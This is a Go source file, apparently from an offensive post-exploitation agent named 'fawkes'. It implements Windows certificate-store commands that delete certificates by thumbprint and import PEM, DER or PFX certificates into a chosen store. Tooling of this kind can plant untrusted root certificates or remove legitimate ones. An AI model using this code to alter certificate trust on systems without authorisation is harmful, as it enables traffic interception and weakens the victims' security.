//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

func certstoreDelete(store, filter string) structs.CommandResult {
	if filter == "" {
		return errorResult("Error: filter (thumbprint) is required for delete action")
	}
	if store == "" {
		return errorResult("Error: store name is required for delete action (e.g., MY, ROOT, CA)")
	}

	locations := []struct {
		name string
		flag uint32
	}{
		{"CurrentUser", certStoreCurrentUserID},
		{"LocalMachine", certStoreLocalMachineID},
	}

	for _, loc := range locations {
		storeNameUTF16, err := windows.UTF16PtrFromString(store)
		if err != nil {
			continue
		}

		storeHandle, _, _ := procCertOpenStore.Call(
			certStoreProvSystemW, 0, 0,
			uintptr(loc.flag),
			uintptr(unsafe.Pointer(storeNameUTF16)),
		)
		if storeHandle == 0 {
			continue
		}

		var prevCtx uintptr
		for {
			ctxPtr, _, _ := procCertEnumCerts.Call(storeHandle, prevCtx)
			if ctxPtr == 0 {
				break
			}
			prevCtx = ctxPtr

			ctx := (*certContext)(unsafe.Pointer(ctxPtr))
			if ctx.CertEncodedLen == 0 || ctx.CertEncoded == 0 {
				continue
			}

			certBytes := unsafe.Slice((*byte)(unsafe.Pointer(ctx.CertEncoded)), ctx.CertEncodedLen)
			thumbprint := sha1Thumbprint(certBytes)

			if !strings.EqualFold(strings.ReplaceAll(thumbprint, ":", ""), strings.ReplaceAll(filter, ":", "")) {
				continue
			}

			subject := getCertName(ctxPtr, certNameSimpleDisplayType, 0)

			// Duplicate context before delete (CertDeleteCertificateFromStore frees the context)
			dupCtx, _, _ := procCertDupCtx.Call(ctxPtr)
			if dupCtx == 0 {
				procCertCloseStore.Call(storeHandle, 0)
				return errorf("Failed to duplicate certificate context for deletion")
			}

			// CertDeleteCertificateFromStore frees the passed context
			r1, _, sysErr := procCertDeleteCert.Call(dupCtx)
			procCertCloseStore.Call(storeHandle, 0)
			if r1 == 0 {
				return errorf("CertDeleteCertificateFromStore failed: %v", sysErr)
			}

			return successResult(fmt.Sprintf("[+] Deleted certificate '%s' from %s/%s\nThumbprint: %s", subject, loc.name, store, thumbprint))
		}
		procCertCloseStore.Call(storeHandle, 0)
	}

	return errorf("Certificate not found with thumbprint: %s in store: %s", filter, store)
}

func certstoreImport(store, data, format, password string) structs.CommandResult {
	if data == "" {
		return errorResult("Error: data (base64-encoded certificate) is required for import action")
	}
	if store == "" {
		store = "MY"
	}
	if format == "" {
		format = "pem"
	}

	rawData, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		// Try raw base64 (no padding)
		rawData, err = base64.RawStdEncoding.DecodeString(data)
		if err != nil {
			return errorf("Error decoding base64 data: %v", err)
		}
	}

	storeNameUTF16, err := windows.UTF16PtrFromString(store)
	if err != nil {
		return errorf("Invalid store name: %v", err)
	}

	storeHandle, _, sysErr := procCertOpenStore.Call(
		certStoreProvSystemW, 0, 0,
		certStoreCurrentUserID,
		uintptr(unsafe.Pointer(storeNameUTF16)),
	)
	if storeHandle == 0 {
		return errorf("Failed to open store %s: %v", store, sysErr)
	}
	defer procCertCloseStore.Call(storeHandle, 0)

	if format == "pfx" {
		return certstoreImportPFX(storeHandle, store, rawData, password)
	}

	// PEM or DER import
	derBytes := rawData
	if format == "pem" {
		block, _ := pem.Decode(rawData)
		if block == nil {
			return errorResult("Error: failed to decode PEM data")
		}
		derBytes = block.Bytes
	}

	r1, _, sysErr := procCertAddEncoded.Call(
		storeHandle,
		certEncodingDefault,
		uintptr(unsafe.Pointer(&derBytes[0])),
		uintptr(len(derBytes)),
		certStoreAddReplaceExisting,
		0,
	)
	if r1 == 0 {
		return errorf("CertAddEncodedCertificateToStore failed: %v", sysErr)
	}

	return successResult(fmt.Sprintf("[+] Imported %s certificate into CurrentUser/%s (%d bytes)", strings.ToUpper(format), store, len(derBytes)))
}

func certstoreImportPFX(storeHandle uintptr, storeName string, pfxData []byte, password string) structs.CommandResult {
	pfxBlob := cryptDataBlobPFX{
		Size: uint32(len(pfxData)),
		Data: uintptr(unsafe.Pointer(&pfxData[0])),
	}

	var pwUTF16 *uint16
	if password != "" {
		pwUTF16, _ = windows.UTF16PtrFromString(password)
	} else {
		pwUTF16, _ = windows.UTF16PtrFromString("")
	}

	// PFXImportCertStore returns a temporary store with the imported certs
	tmpStore, _, sysErr := procPFXImportStore.Call(
		uintptr(unsafe.Pointer(&pfxBlob)),
		uintptr(unsafe.Pointer(pwUTF16)),
		exportableFlag,
	)
	if tmpStore == 0 {
		return errorf("PFXImportCertStore failed: %v (wrong password?)", sysErr)
	}
	defer procCertCloseStore.Call(tmpStore, 0)

	// Enumerate certs from the PFX store and add them to the target store
	var count int
	var prevCtx uintptr
	for {
		ctxPtr, _, _ := procCertEnumCerts.Call(tmpStore, prevCtx)
		if ctxPtr == 0 {
			break
		}
		prevCtx = ctxPtr

		ctx := (*certContext)(unsafe.Pointer(ctxPtr))
		if ctx.CertEncodedLen == 0 || ctx.CertEncoded == 0 {
			continue
		}

		certBytes := unsafe.Slice((*byte)(unsafe.Pointer(ctx.CertEncoded)), ctx.CertEncodedLen)

		r1, _, _ := procCertAddEncoded.Call(
			storeHandle,
			certEncodingDefault,
			uintptr(unsafe.Pointer(&certBytes[0])),
			uintptr(len(certBytes)),
			certStoreAddReplaceExisting,
			0,
		)
		if r1 != 0 {
			count++
		}
	}

	if count == 0 {
		return errorResult("No certificates found in PFX file")
	}

	return successResult(fmt.Sprintf("[+] Imported %d certificate(s) from PFX into CurrentUser/%s", count, storeName))
}
